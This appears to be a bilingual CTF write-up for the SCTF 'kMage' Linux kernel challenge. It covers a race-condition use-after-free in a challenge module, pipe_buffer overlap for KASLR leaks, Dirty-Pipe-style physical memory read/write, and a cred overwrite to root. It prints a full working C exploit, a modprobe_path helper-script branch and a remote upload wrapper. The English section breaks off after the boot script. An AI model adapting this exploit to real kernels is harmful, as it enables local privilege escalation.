---
title: "SCTF kMage Writeup"
published: 2026-06-30
description: "SCTF kMage 문제 풀이."
category: "CTF/Wargame"
tags: ["SCTF", "CTF", "Writeup", "Pwnable"]
draft: false
listed: false
---

<div class="post-language-switch" data-post-language-switch role="group" aria-label="Article language">
    <a class="post-language-switch__button no-styling" data-post-language-link="ko" href="/posts/sctf-kmage/kr/">KR</a>
    <a class="post-language-switch__button no-styling" data-post-language-link="en" href="/posts/sctf-kmage/en/">EN</a>
</div>

:::section{data-post-language-panel="ko"}
# kMage

## 1. 분석 대상

제공 환경은 Linux 7.0.11 커널, initramfs, `sycmem.ko` 커널 모듈로 구성된다. 부팅 스크립트는 모듈을 올린 뒤 `/dev/sycmem`을 일반 사용자에게 열어 두고 `/flag`는 root만 읽을 수 있게 만든다.

```bash
insmod /sycmem.ko
chmod 666 /dev/sycmem 2>/dev/null || true
chown root:root /flag
chmod 400 /flag
```

`/dev/sycmem`의 ioctl은 `SYC_ALLOC`, `SYC_FREE`, `SYC_READ`, `SYC_WRITE` 네 가지다. 모듈은 0x1000바이트 slab 객체를 전역 `slots` 배열에 보관하고 `READ`/`WRITE`는 사용자가 넘긴 `idx`, `off`, `len`, `buf`로 slot 객체와 user buffer 사이를 복사한다.

```text
SYC_ALLOC = 0x40205310
SYC_FREE  = 0x40205311
SYC_READ  = 0xc0205312
SYC_WRITE = 0x40205313
```

취약점은 `SYC_FREE`에 있다. disassembly 기준으로 모듈은 `kmem_cache_free()`로 slot pointer를 해제한 뒤 바로 slot을 지우지 않는다. lock을 풀고 `kmem_cache_shrink()`와 선택적인 `copy_to_user(done, ...)`를 처리한 다음에야 다시 lock을 잡고 slot pointer와 size를 초기화한다.

```text
kmem_cache_free(slot)
mutex_unlock(...)
kmem_cache_shrink(...)
copy_to_user(done, ...)
mutex_lock(...)
slot.ptr = NULL
slot.size = 0
```

이 창이 열려 있는 동안 다른 thread가 같은 slot을 `READ`/`WRITE` 대상으로 사용할 수 있다. 해제된 0x1000 객체가 다른 커널 객체로 재사용된 뒤에도 `/dev/sycmem`은 여전히 그 주소를 읽고 쓸 수 있으므로, race 기반 UAF가 된다.

## 2. 풀이

race window를 넓히려고 `FREE`는 별도 thread에서 호출하고 `done`이 가리키는 anonymous page에는 `madvise(MADV_DONTNEED)`를 걸었다. `FREE` 끝부분의 `copy_to_user(done, ...)`에서 page fault가 나면 slot reset 전 구간이 조금 더 길어진다.

해제된 0x1000 객체는 pipe ring과 겹치게 만들었다. 많은 pipe를 만들고 `F_SETPIPE_SZ`로 ring을 키운 뒤 한 바이트를 써서 `pipe_buffer`를 초기화한다. 직후 UAF read로 slot 내용을 훑어 `pipe_buffer`처럼 보이는 구조를 찾았다.

```c
struct pipe_buffer_user {
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};
```

`page`와 `ops`가 커널 포인터처럼 보이고 `ops`의 하위 비트가 정적 `anon_pipe_buf_ops` offset과 맞으면 overlap이 성공한 것으로 봤다. 이 leak에서 `anon_pipe_buf_ops` 주소로 KASLR slide를 얻고 pipe page pointer로 `vmemmap` 후보를 잡을 수 있다.

그다음 UAF write로 pipe ring 전체를 fake `pipe_buffer` 배열로 갈아끼웠다. 읽기 primitive는 target physical page에 대응하는 `struct page *`를 `page`에 넣고 `offset`, `len`을 맞춘 뒤 pipe read를 호출하는 방식이다. `ops`는 `anon_pipe_buf_ops` 대신 `zero_pipe_buf_ops`로 바꿨다. `anon_pipe_buf_ops`를 그대로 쓰면 release 경로가 임의 task page에 `put_page()`를 호출해 커널이 불안정해졌다.

쓰기 primitive는 Dirty Pipe와 같은 형태다. `PIPE_BUF_FLAG_CAN_MERGE`에 해당하는 flag를 세우고 `offset = target_offset - 1`, `len = 1`로 둔 뒤 pipe write를 호출하면 원하는 page offset에 데이터가 들어간다.

커널 주소를 physical address로 바꾸기 위해 KASLR slide와 정적 symbol offset을 함께 썼다. `anon_pipe_buf_ops` leak으로 slide를 얻고 커널 이미지의 physical base를 2 MB 단위로 훑으면서 `page_offset_base`와 `vmemmap_base`를 읽어 후보를 검증했다.

권한 상승은 `modprobe_path` 대신 cred overwrite로 마무리했다. `modprobe_path` 자체는 덮을 수 있었지만 이 환경에서는 helper 실행이 flag 획득으로 이어지지 않았다. exploit process의 `comm`을 `kmage-main`으로 바꾼 뒤 `init_task`에서 `children`/`sibling` list를 DFS로 걸어 해당 task를 찾았다.

```text
children offset = 0x5d0
sibling offset  = 0x5e0
cred offset     = 0x780
comm offset     = 0x798
```

대상 task를 찾은 뒤 `real_cred`와 `cred`를 모두 `init_cred`로 바꿨다. 같은 프로세스가 uid 0이 되었고 그대로 `/flag`를 열어 출력할 수 있었다.

## 3. Exploit

아래 C 코드는 실제 권한 상승에 사용한 exploit이다. 기본 경로는 cred overwrite이며 `USE_MODPROBE` 환경변수를 주면 실험용 `modprobe_path` 분기도 실행할 수 있다.

### exploit.c

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

#define SYC_ALLOC 0x40205310UL
#define SYC_FREE  0x40205311UL
#define SYC_READ  0xc0205312UL
#define SYC_WRITE 0x40205313UL

#define PAGE_SIZE 0x1000UL
#define PIPE_SIZE 0x40000
#define MAX_PIPES 96
#define LEAK_ATTEMPTS 500
#define WRITE_ATTEMPTS 160

#define STATIC_STEXT          0xffffffff81000000ULL
#define STATIC_ANON_PIPE_OPS  0xffffffff826265c0ULL
#define STATIC_ZERO_PIPE_OPS  0xffffffff82621060ULL
#define STATIC_MODPROBE_PATH  0xffffffff82f4ae80ULL
#define STATIC_VMEMMAP_BASE   0xffffffff82cc9210ULL
#define STATIC_PAGE_OFFSET    0xffffffff82cc9220ULL
#define STATIC_INIT_TASK      0xffffffff82e0ea00ULL
#define STATIC_INIT_CRED      0xffffffff82e0f680ULL
#define STRUCT_PAGE_SIZE      0x40ULL
#define VMEMMAP_ALIGN         0x200000ULL

#define TASKS_OFF             0x4e8ULL
#define CHILDREN_OFF          0x5d0ULL
#define SIBLING_OFF           0x5e0ULL
#define CRED_OFF              0x780ULL
#define COMM_OFF              0x798ULL
#define TASK_READ_LEN         0x2c0UL

#define LOW21(x) ((x) & 0x1fffffULL)

struct syc_req {
    uint32_t idx;
    uint32_t len;
    uint64_t off;
    uint64_t buf;
    uint64_t done;
};

struct free_arg {
    int fd;
    void *done_page;
};

struct pipe_buffer_user {
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

static int syc_ioctl(int fd, unsigned long cmd, struct syc_req *req) {
    return ioctl(fd, cmd, req);
}

static void *free_thread(void *argp) {
    prctl(PR_SET_NAME, "kmage-free", 0, 0, 0);
    struct free_arg *arg = (struct free_arg *)argp;
    struct syc_req req = {
        .idx = 0,
        .done = (uint64_t)arg->done_page,
    };
    syc_ioctl(arg->fd, SYC_FREE, &req);
    return NULL;
}

static int looks_like_anon_ops(uint64_t v) {
    return (v >> 48) == 0xffff && LOW21(v) == LOW21(STATIC_ANON_PIPE_OPS);
}

static int scan_pipe_buffers(unsigned char *buf, uint64_t *ops_out, uint64_t *page_out) {
    for (int off = 0; off + (int)sizeof(struct pipe_buffer_user) <= 0x1000; off += 8) {
        struct pipe_buffer_user *pb = (struct pipe_buffer_user *)(buf + off);
        if ((pb->page >> 48) == 0xffff &&
            looks_like_anon_ops(pb->ops) &&
            (pb->flags & ~0x7fU) == 0) {
            *ops_out = pb->ops;
            *page_out = pb->page;
            return off;
        }
    }
    return -1;
}

static uint64_t page_ptr_from_phys(uint64_t vmemmap_base, uint64_t phys) {
    return vmemmap_base + ((phys >> 12) * STRUCT_PAGE_SIZE);
}

static void close_pipes(int pipes[][2], int n) {
    for (int i = 0; i < n; i++) {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }
}

static int make_pipes(int pipes[][2]) {
    int n = 0;
    for (; n < MAX_PIPES; n++) {
        if (pipe(pipes[n]) != 0) break;
    }
    return n;
}

static int alloc_sycmem(int fd, unsigned char *init) {
    struct syc_req req = {
        .idx = 0,
        .len = 0x1000,
        .off = 0,
        .buf = (uint64_t)init,
    };
    return syc_ioctl(fd, SYC_ALLOC, &req);
}

static int leak_pipe_ops(int fd, void *done, unsigned char *init,
                         unsigned char *leak, unsigned char *data,
                         uint64_t *ops_out, uint64_t *pipe_page_out) {
    for (int attempt = 1; attempt <= LEAK_ATTEMPTS; attempt++) {
        int pipes[MAX_PIPES][2];
        int npipes = make_pipes(pipes);
        if (npipes <= 0) return -1;

        if (alloc_sycmem(fd, init) != 0) {
            close_pipes(pipes, npipes);
            continue;
        }

        madvise(done, PAGE_SIZE, MADV_DONTNEED);
        struct free_arg farg = {.fd = fd, .done_page = done};
        pthread_t th;
        pthread_create(&th, NULL, free_thread, &farg);

        for (int i = 0; i < npipes; i++) {
            fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_SIZE);
            if (write(pipes[i][1], data, 1) < 0) {
                continue;
            }

            memset(leak, 0, 0x1000);
            struct syc_req rreq = {
                .idx = 0,
                .len = 0x1000,
                .off = 0,
                .buf = (uint64_t)leak,
            };
            if (syc_ioctl(fd, SYC_READ, &rreq) == 0) {
                uint64_t ops = 0, page = 0;
                int off = scan_pipe_buffers(leak, &ops, &page);
                if (off >= 0) {
                    *ops_out = ops;
                    *pipe_page_out = page;
                    printf("[+] leak attempt=%d pipe=%d off=0x%x ops=0x%016llx page=0x%016llx\n",
                           attempt, i, off,
                           (unsigned long long)ops,
                           (unsigned long long)page);
                    pthread_join(th, NULL);
                    close_pipes(pipes, npipes);
                    return 0;
                }
            }
        }

        pthread_join(th, NULL);
        close_pipes(pipes, npipes);
        if ((attempt % 50) == 0) {
            printf("[-] leak attempt=%d\n", attempt);
            fflush(stdout);
        }
    }
    return -1;
}

static void dump_modprobe_sysctl(void) {
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0) {
        perror("open modprobe sysctl");
        return;
    }
    unsigned char buf[128];
    ssize_t n = read(fd, buf, sizeof(buf));
    close(fd);
    if (n < 0) {
        perror("read modprobe sysctl");
        return;
    }
    printf("[modprobe]");
    for (ssize_t i = 0; i < n; i++) {
        unsigned char c = buf[i];
        if (c >= 0x20 && c <= 0x7e) {
            putchar(c);
        } else {
            printf("\\x%02x", c);
        }
    }
    putchar('\n');
}

static void build_pipe_payload(unsigned char *payload, uint64_t target_page,
                               uint64_t anon_ops, int off_delta,
                               uint32_t pb_len) {
    memset(payload, 0, 0x1000);
    uint32_t target_off = (uint32_t)(STATIC_MODPROBE_PATH & 0xfff);
    for (int off = 0; off + (int)sizeof(struct pipe_buffer_user) <= 0x1000;
         off += sizeof(struct pipe_buffer_user)) {
        struct pipe_buffer_user *pb = (struct pipe_buffer_user *)(payload + off);
        pb->page = target_page;
        pb->offset = target_off + off_delta;
        pb->len = pb_len;
        pb->ops = anon_ops;
        pb->flags = 0x10;
        pb->private = 0;
    }
}

static void build_read_payload(unsigned char *payload, uint64_t target_page,
                               uint32_t target_off, uint32_t len,
                               uint64_t anon_ops) {
    memset(payload, 0, 0x1000);
    for (int off = 0; off + (int)sizeof(struct pipe_buffer_user) <= 0x1000;
         off += sizeof(struct pipe_buffer_user)) {
        struct pipe_buffer_user *pb = (struct pipe_buffer_user *)(payload + off);
        pb->page = target_page;
        pb->offset = target_off;
        pb->len = len;
        pb->ops = anon_ops;
        pb->flags = 0;
        pb->private = 0;
    }
}

static int corrupt_pipe_ring_once(int fd, void *done, unsigned char *init,
                                  unsigned char *leak,
                                  unsigned char *payload,
                                  int pipes[][2], int *npipes_out,
                                  int *hit_out) {
    int npipes = make_pipes(pipes);
    *npipes_out = npipes;
    *hit_out = -1;
    if (npipes <= 0) return -1;

    if (alloc_sycmem(fd, init) != 0) {
        close_pipes(pipes, npipes);
        return -1;
    }

    madvise(done, PAGE_SIZE, MADV_DONTNEED);
    struct free_arg farg = {.fd = fd, .done_page = done};
    pthread_t th;
    pthread_create(&th, NULL, free_thread, &farg);

    int ok = 0;
    for (int i = 0; i < npipes; i++) {
        fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_SIZE);
        char one = 'A';
        if (write(pipes[i][1], &one, 1) < 0) continue;

        memset(leak, 0, 0x1000);
        struct syc_req rreq = {
            .idx = 0,
            .len = 0x1000,
            .off = 0,
            .buf = (uint64_t)leak,
        };
        uint64_t tmp_ops = 0, tmp_page = 0;
        if (syc_ioctl(fd, SYC_READ, &rreq) != 0 ||
            scan_pipe_buffers(leak, &tmp_ops, &tmp_page) < 0) {
            continue;
        }

        struct syc_req wreq = {
            .idx = 0,
            .len = 0x1000,
            .off = 0,
            .buf = (uint64_t)payload,
        };
        if (syc_ioctl(fd, SYC_WRITE, &wreq) == 0) {
            *hit_out = i;
            ok = 1;
            break;
        }
    }

    pthread_join(th, NULL);
    if (!ok) {
        close_pipes(pipes, npipes);
        return -1;
    }
    return 0;
}

static int phys_read_once(int fd, void *done, unsigned char *init,
                          unsigned char *leak, unsigned char *payload,
                          uint64_t vmemmap_base, uint64_t anon_ops,
                          uint64_t phys, void *out, size_t len) {
    if (len == 0 || len > 0xf00 || ((phys & 0xfff) + len) > 0x1000) {
        return -1;
    }

    uint64_t target_page = page_ptr_from_phys(vmemmap_base, phys & ~0xfffULL);
    uint64_t zero_ops = anon_ops + (STATIC_ZERO_PIPE_OPS - STATIC_ANON_PIPE_OPS);
    build_read_payload(payload, target_page, (uint32_t)(phys & 0xfff),
                       (uint32_t)len, zero_ops);

    for (int attempt = 0; attempt < 80; attempt++) {
        int pipes[MAX_PIPES][2];
        int npipes = 0, hit = -1;
        if (corrupt_pipe_ring_once(fd, done, init, leak, payload,
                                   pipes, &npipes, &hit) != 0) {
            continue;
        }

        ssize_t n = -1;
        if (hit >= 0) {
            n = read(pipes[hit][0], out, len);
        }
        close_pipes(pipes, npipes);
        if (n == (ssize_t)len) return 0;
    }
    return -1;
}

static int phys_write_once(int fd, void *done, unsigned char *init,
                           unsigned char *leak, unsigned char *payload,
                           uint64_t vmemmap_base, uint64_t anon_ops,
                           uint64_t phys, const void *data, size_t len) {
    if (len == 0 || len > 0xf00 || (phys & 0xfff) == 0 ||
        ((phys & 0xfff) + len) > 0x1000) {
        return -1;
    }

    uint64_t target_page = page_ptr_from_phys(vmemmap_base, phys & ~0xfffULL);
    uint64_t zero_ops = anon_ops + (STATIC_ZERO_PIPE_OPS - STATIC_ANON_PIPE_OPS);
    memset(payload, 0, 0x1000);
    for (int off = 0; off + (int)sizeof(struct pipe_buffer_user) <= 0x1000;
         off += sizeof(struct pipe_buffer_user)) {
        struct pipe_buffer_user *pb = (struct pipe_buffer_user *)(payload + off);
        pb->page = target_page;
        pb->offset = (uint32_t)(phys & 0xfff) - 1;
        pb->len = 1;
        pb->ops = zero_ops;
        pb->flags = 0x10;
        pb->private = 0;
    }

    for (int attempt = 0; attempt < 160; attempt++) {
        int pipes[MAX_PIPES][2];
        int npipes = 0, hit = -1;
        if (corrupt_pipe_ring_once(fd, done, init, leak, payload,
                                   pipes, &npipes, &hit) != 0) {
            continue;
        }

        int writes = 0;
        for (int i = 0; i < npipes; i++) {
            ssize_t n = write(pipes[i][1], data, len);
            if (n == (ssize_t)len) writes++;
        }
        if (writes > 0) {
            return 0;
        }
        close_pipes(pipes, npipes);
    }
    return -1;
}

static uint64_t image_phys(uint64_t phys_code, uint64_t static_addr) {
    return phys_code + (static_addr - STATIC_STEXT);
}

static int kread_bytes(int fd, void *done, unsigned char *init,
                       unsigned char *leak, unsigned char *payload,
                       uint64_t vmemmap_base, uint64_t anon_ops,
                       uint64_t phys_code, uint64_t kaslr,
                       uint64_t page_offset_base, uint64_t kaddr,
                       void *out, size_t len) {
    unsigned char *p = out;
    while (len > 0) {
        uint64_t phys;
        if (kaddr >= page_offset_base && kaddr < page_offset_base + 0x10000000ULL) {
            phys = kaddr - page_offset_base;
        } else {
            uint64_t static_addr = kaddr - kaslr;
            phys = image_phys(phys_code, static_addr);
        }
        size_t chunk = 0x1000 - (phys & 0xfff);
        if (chunk > len) chunk = len;
        if (phys_read_once(fd, done, init, leak, payload, vmemmap_base,
                           anon_ops, phys, p, chunk) != 0) {
            return -1;
        }
        p += chunk;
        kaddr += chunk;
        len -= chunk;
    }
    return 0;
}

static int try_cred_lpe(int fd, void *done, unsigned char *init,
                        unsigned char *leak, unsigned char *payload,
                        uint64_t vmemmap_base, uint64_t anon_ops,
                        uint64_t phys_code, uint64_t kaslr) {
    uint64_t page_offset_base = 0;
    uint64_t page_offset_phys = image_phys(phys_code, STATIC_PAGE_OFFSET);
    if (phys_read_once(fd, done, init, leak, payload, vmemmap_base, anon_ops,
                       page_offset_phys, &page_offset_base,
                       sizeof(page_offset_base)) != 0) {
        puts("[-] page_offset_base read failed");
        return -1;
    }
    printf("[+] page_offset_base=0x%016llx\n",
           (unsigned long long)page_offset_base);
    if ((page_offset_base >> 48) != 0xffffULL ||
        (page_offset_base & 0x3fffffffULL) != 0) {
        puts("[-] invalid page_offset_base");
        return -1;
    }

    uint64_t kernel_vmemmap_base = 0;
    if (phys_read_once(fd, done, init, leak, payload, vmemmap_base, anon_ops,
                       image_phys(phys_code, STATIC_VMEMMAP_BASE),
                       &kernel_vmemmap_base,
                       sizeof(kernel_vmemmap_base)) != 0) {
        puts("[-] vmemmap_base read failed");
        return -1;
    }
    if (kernel_vmemmap_base != vmemmap_base) {
        printf("[-] invalid vmemmap_base=0x%016llx expected=0x%016llx\n",
               (unsigned long long)kernel_vmemmap_base,
               (unsigned long long)vmemmap_base);
        return -1;
    }

    uint64_t init_task = STATIC_INIT_TASK + kaslr;
    uint64_t init_cred = STATIC_INIT_CRED + kaslr;
    int verbose_tasks = getenv("VERBOSE_TASKS") != NULL;

    uint64_t stack[256];
    int sp = 0;
    stack[sp++] = init_task;
    int seen = 0;

    while (sp > 0 && seen < 512) {
        uint64_t parent = stack[--sp];
        uint64_t head = parent + CHILDREN_OFF;
        uint64_t entry = 0;
        if (kread_bytes(fd, done, init, leak, payload, vmemmap_base, anon_ops,
                        phys_code, kaslr, page_offset_base, head,
                        &entry, sizeof(entry)) != 0) {
            continue;
        }

        for (int siblings = 0; siblings < 256 && entry && entry != head; siblings++) {
            uint64_t next = 0;
            if (kread_bytes(fd, done, init, leak, payload, vmemmap_base,
                            anon_ops, phys_code, kaslr, page_offset_base,
                            entry, &next, sizeof(next)) != 0) {
                break;
            }

            uint64_t task = entry - SIBLING_OFF;
            char comm[17];
            memset(comm, 0, sizeof(comm));
            if (kread_bytes(fd, done, init, leak, payload, vmemmap_base,
                            anon_ops, phys_code, kaslr, page_offset_base,
                            task + COMM_OFF, comm, 16) != 0) {
                entry = next;
                continue;
            }
            comm[16] = 0;
            if (verbose_tasks && seen < 120) {
                printf("[task] %03d task=0x%016llx entry=0x%016llx next=0x%016llx comm='%s'\n",
                       seen, (unsigned long long)task,
                       (unsigned long long)entry,
                       (unsigned long long)next, comm);
            }
            seen++;

        if (strcmp(comm, "kmage-main") == 0) {
            uint64_t cred_pair[2] = {init_cred, init_cred};
            uint64_t cred_kaddr = task + CRED_OFF;
            uint64_t cred_phys;
            if (cred_kaddr >= page_offset_base &&
                cred_kaddr < page_offset_base + 0x10000000ULL) {
                cred_phys = cred_kaddr - page_offset_base;
            } else {
                cred_phys = image_phys(phys_code, cred_kaddr - kaslr);
            }
            printf("[+] found task=0x%016llx entry=0x%016llx cred=0x%016llx init_cred=0x%016llx\n",
                   (unsigned long long)task,
                   (unsigned long long)entry,
                   (unsigned long long)cred_kaddr,
                   (unsigned long long)init_cred);
            if (phys_write_once(fd, done, init, leak, payload, vmemmap_base,
                                anon_ops, cred_phys, cred_pair,
                                sizeof(cred_pair)) != 0) {
                puts("[-] cred write failed");
                return -1;
            }
            usleep(100000);
            printf("[+] uid=%d euid=%d\n", getuid(), geteuid());
            return getuid() == 0 ? 0 : -1;
        }

            if (sp < (int)(sizeof(stack) / sizeof(stack[0]))) {
                stack[sp++] = task;
            }
            entry = next;
        }
    }

    puts("[-] task not found");
    return -1;
}

static int dirty_modprobe_once(int fd, void *done, unsigned char *init,
                               unsigned char *leak, unsigned char *payload,
                               const char *new_path) {
    int pipes[MAX_PIPES][2];
    int npipes = make_pipes(pipes);
    if (npipes <= 0) return -1;

    if (alloc_sycmem(fd, init) != 0) {
        close_pipes(pipes, npipes);
        return -1;
    }

    madvise(done, PAGE_SIZE, MADV_DONTNEED);
    struct free_arg farg = {.fd = fd, .done_page = done};
    pthread_t th;
    pthread_create(&th, NULL, free_thread, &farg);

    int writes = 0;
    for (int i = 0; i < npipes; i++) {
        fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_SIZE);
        char one = 'A';
        if (write(pipes[i][1], &one, 1) < 0) continue;

        memset(leak, 0, 0x1000);
        struct syc_req rreq = {
            .idx = 0,
            .len = 0x1000,
            .off = 0,
            .buf = (uint64_t)leak,
        };
        uint64_t tmp_ops = 0, tmp_page = 0;
        if (syc_ioctl(fd, SYC_READ, &rreq) != 0 ||
            scan_pipe_buffers(leak, &tmp_ops, &tmp_page) < 0) {
            continue;
        }

        struct syc_req wreq = {
            .idx = 0,
            .len = 0x1000,
            .off = 0,
            .buf = (uint64_t)payload,
        };
        if (syc_ioctl(fd, SYC_WRITE, &wreq) == 0) {
            writes++;
            break;
        }
    }

    pthread_join(th, NULL);

    size_t n = strlen(new_path) + 1;
    for (int i = 0; i < npipes; i++) {
        (void)write(pipes[i][1], new_path, n);
    }

    if (writes == 0) {
        close_pipes(pipes, npipes);
    }
    return writes;
}

static void setup_modprobe_files(void) {
    const char *helper =
        "#!/bin/sh\n"
        "cat /flag > /home/ctf/flag\n"
        "chmod 666 /home/ctf/flag\n";
    int fd = open("/home/ctf/h", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (fd >= 0) {
        write(fd, helper, strlen(helper));
        close(fd);
        chmod("/home/ctf/h", 0777);
    }
    fd = open("/home/ctf/x", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (fd >= 0) {
        unsigned char bad[] = {0xff, 0xff, 0xff, 0xff};
        write(fd, bad, sizeof(bad));
        close(fd);
        chmod("/home/ctf/x", 0777);
    }
    unlink("/home/ctf/flag");
}

static int trigger_and_print_flag(void) {
    pid_t pid = fork();
    if (pid == 0) {
        execl("/home/ctf/x", "x", NULL);
        _exit(111);
    }
    int st = 0;
    waitpid(pid, &st, 0);
    usleep(200000);

    int fd = open("/home/ctf/flag", O_RDONLY);
    if (fd < 0) return -1;
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = 0;
    printf("[FLAG] %s\n", buf);
    return 0;
}

static int print_root_flag(void) {
    int fd = open("/flag", O_RDONLY);
    if (fd < 0) {
        perror("open /flag");
        return -1;
    }
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = 0;
    printf("[FLAG] %s\n", buf);
    return 0;
}

int main(int argc, char **argv) {
    prctl(PR_SET_NAME, "kmage-main", 0, 0, 0);

    uint64_t first_phys = 0x01000000ULL;
    uint64_t last_phys = 0x05600000ULL;
    if (argc == 2) {
        first_phys = last_phys = strtoull(argv[1], NULL, 0);
    } else if (argc == 3) {
        first_phys = strtoull(argv[1], NULL, 0);
        last_phys = strtoull(argv[2], NULL, 0);
    }

    int fd = open("/dev/sycmem", O_RDWR);
    if (fd < 0) {
        perror("open /dev/sycmem");
        return 1;
    }

    void *done = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *init = aligned_alloc(0x1000, 0x1000);
    unsigned char *leak = aligned_alloc(0x1000, 0x1000);
    unsigned char *data = aligned_alloc(0x1000, 0x1000);
    unsigned char *payload = aligned_alloc(0x1000, 0x1000);
    if (done == MAP_FAILED || !init || !leak || !data || !payload) {
        perror("alloc");
        return 1;
    }
    memset(init, 0x41, 0x1000);
    memset(data, 0x42, 0x1000);

    uint64_t anon_ops = 0, pipe_page = 0;
    if (leak_pipe_ops(fd, done, init, leak, data, &anon_ops, &pipe_page) != 0) {
        puts("[-] failed to leak pipe_buffer");
        return 1;
    }
    uint64_t kaslr = anon_ops - STATIC_ANON_PIPE_OPS;
    uint64_t vmemmap_base = pipe_page & ~(VMEMMAP_ALIGN - 1);
    uint64_t sample_pipe_phys =
        ((pipe_page - vmemmap_base) / STRUCT_PAGE_SIZE) << 12;
    printf("[+] kbase=0x%016llx kaslr=0x%llx sample_pipe_phys=0x%llx\n",
           (unsigned long long)(STATIC_STEXT + kaslr),
           (unsigned long long)kaslr,
           (unsigned long long)sample_pipe_phys);
    printf("[+] vmemmap_base=0x%016llx\n", (unsigned long long)vmemmap_base);

    int use_modprobe = getenv("USE_MODPROBE") != NULL;
    const char *new_path = getenv("NEW_PATH");
    if (!new_path) new_path = "/home/ctf/h";
    if (use_modprobe) setup_modprobe_files();
    uint64_t modprobe_phys_off = STATIC_MODPROBE_PATH - STATIC_STEXT;
    int off_delta = -1;
    uint32_t pb_len = 1;
    char *env = getenv("OFF_DELTA");
    if (env) off_delta = (int)strtol(env, NULL, 0);
    env = getenv("PB_LEN");
    if (env) pb_len = (uint32_t)strtoul(env, NULL, 0);
    int no_trigger = getenv("NO_TRIGGER") != NULL;
    printf("[*] mode=%s\n", use_modprobe ? "modprobe" : "cred");
    if (use_modprobe) {
        printf("[*] pipe payload offset_delta=%d pb_len=%u no_trigger=%d\n",
               off_delta, pb_len, no_trigger);
        dump_modprobe_sysctl();
    }

    for (uint64_t phys = first_phys; phys <= last_phys; phys += 0x200000ULL) {
        printf("[*] try phys_code=0x%llx\n", (unsigned long long)phys);
        fflush(stdout);

        if (!use_modprobe) {
            if (try_cred_lpe(fd, done, init, leak, payload, vmemmap_base,
                             anon_ops, phys, kaslr) == 0 &&
                print_root_flag() == 0) {
                return 0;
            }
            continue;
        }

        uint64_t target_phys = phys + modprobe_phys_off;
        uint64_t target_page = page_ptr_from_phys(vmemmap_base, target_phys);
        build_pipe_payload(payload, target_page, anon_ops, off_delta, pb_len);
        printf("[*] target_page=0x%llx\n", (unsigned long long)target_page);
        fflush(stdout);

        for (int attempt = 1; attempt <= WRITE_ATTEMPTS; attempt++) {
            int wr = dirty_modprobe_once(fd, done, init, leak, payload, new_path);
            if (wr > 0) {
                printf("[*] write attempt=%d ioctl_writes=%d\n", attempt, wr);
                fflush(stdout);
                dump_modprobe_sysctl();
                if (no_trigger) return 0;
                if (trigger_and_print_flag() == 0) return 0;
            }
        }
    }

    puts("[-] exploit failed");
    return 1;
}
```

원격 wrapper는 컴파일된 exploit을 gzip/base64로 압축해 shell에 올리고 실행한다.

### remote_solve.py

```python
#!/usr/bin/env python3
import base64
import gzip
import select
import socket
import sys
import time
from pathlib import Path

HOST = "1.95.125.195"
PORT = 5000


def recv_until(sock, marker=b"$ ", timeout=30):
    buf = b""
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], 0.2)
        if not r:
            continue
        data = sock.recv(4096)
        if not data:
            break
        buf += data
        if marker in buf:
            break
    return buf


def recv_for(sock, timeout=180):
    buf = b""
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], 0.5)
        if not r:
            continue
        data = sock.recv(4096)
        if not data:
            break
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()
        buf += data
        if b"[FLAG]" in buf or b"flag{" in buf or b"Kernel panic" in buf:
            # Keep reading a moment so the full line arrives.
            end = min(end, time.time() + 2)
    return buf


def main():
    raw = Path("exploit").read_bytes()
    payload = base64.b64encode(gzip.compress(raw, compresslevel=9)).decode()
    lines = "\n".join(payload[i:i + 76] for i in range(0, len(payload), 76))

    sock = socket.create_connection((HOST, PORT), timeout=10)
    sock.setblocking(False)
    sys.stdout.buffer.write(recv_until(sock, b"$ ", 20))
    sys.stdout.buffer.flush()

    script = (
        "cat > /home/ctf/exploit.gz.b64 <<'EOF'\n"
        + lines
        + "\nEOF\n"
        "base64 -d /home/ctf/exploit.gz.b64 > /home/ctf/exploit.gz\n"
        "gzip -d /home/ctf/exploit.gz\n"
        "chmod +x /home/ctf/exploit\n"
        "/home/ctf/exploit\n"
    ).encode()

    sock.setblocking(True)
    for i in range(0, len(script), 2048):
        sock.sendall(script[i:i + 2048])
        time.sleep(0.003)
    sock.setblocking(False)

    out = recv_for(sock, 240)
    sock.close()
    return 0 if b"flag{" in out else 1


if __name__ == "__main__":
    raise SystemExit(main())
```

실행 결과 프로세스가 root cred로 바뀌었고 `/flag`를 직접 읽었다.

```text
[+] uid=0 euid=0
[FLAG] SCTF{g0o0o0o-f0r-@-puNch-k3rnEL-M4st3r}
```

## 4. Flag

```text
SCTF{g0o0o0o-f0r-@-puNch-k3rnEL-M4st3r}
```
:::

:::section{data-post-language-panel="en"}
# kMage

## 1. Analysis focus

The provided environment consists of a Linux 7.0.11 kernel, an initramfs, and the `sycmem.ko` kernel module. The boot script loads the module, makes `/dev/sycmem` accessible to normal users, and leaves `/flag` readable only by root.

```bash
insmod /sycmem.ko
chmod 666 /dev/sycmem 2>/dev/null || true
chown root:root /flag
chmod 400 /flag
```

